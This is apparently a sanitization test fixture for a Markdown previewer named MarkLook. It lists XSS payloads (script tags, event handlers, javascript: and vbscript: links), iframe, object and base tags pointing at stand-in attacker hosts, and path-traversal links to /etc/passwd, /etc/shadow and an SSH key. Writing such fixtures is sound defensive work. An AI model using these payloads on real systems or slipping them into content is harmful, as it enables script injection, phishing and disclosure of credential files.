# Security & Sanitization Test Fixture

This document contains intentionally malicious payloads to verify that MarkLook's parser, sanitizer, and resource resolver eliminate security threats.

### Direct Script Injections
<script>alert("XSS 1");</script>
<script type="text/javascript">window.location="https://malicious-site.example";</script>

### Malicious Inline Event Handlers
<img src="nonexistent.png" onerror="alert('XSS 2')">
<div onmouseover="alert('XSS 3')" onclick="alert('XSS 4')">Hover or click this text</div>
<svg onload="alert('XSS 5')"></svg>

### Malicious Link Schemes
[Dangerous Javascript Link](javascript:alert("XSS Link"))
[Encoded Javascript Link](&#106;avascript:alert("XSS Encoded"))
[VBScript Link](vbscript:msgbox("XSS"))
[Data HTML Link](data:text/html,<script>alert(1)</script>)

### Dangerous Embedding Tags
<iframe src="https://attacker.example/phishing"></iframe>
<object data="https://attacker.example/payload"></object>
<embed src="https://attacker.example/flash"></embed>
<base href="https://evil.example/">

### Path Traversal Attempts
![Etc Passwd](../../../../../../etc/passwd)
![Shadow File](../../../../../../etc/shadow)
![SSH Key](../../../../.ssh/id_rsa)
